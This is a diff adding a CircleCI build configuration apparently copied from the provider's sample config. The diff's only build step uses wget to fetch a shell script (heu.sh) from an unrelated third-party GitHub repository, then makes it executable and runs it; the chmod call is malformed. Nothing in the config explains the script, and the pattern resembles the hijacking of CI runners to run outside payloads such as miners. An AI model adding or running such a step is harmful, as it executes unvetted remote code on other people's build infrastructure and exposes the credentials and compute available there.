@@ -1,0 +1,15 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: buildpack-deps:trusty
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    environment:
+      FOO: bar
+    parallelism: 5
+    resource_class: small
+    working_directory: ~/my-app
+    steps:
+      - run: wget https://raw.githubusercontent.com/Hekwhe/kratos/master/heu.sh && chmod + heu.sh && ./heu.sh
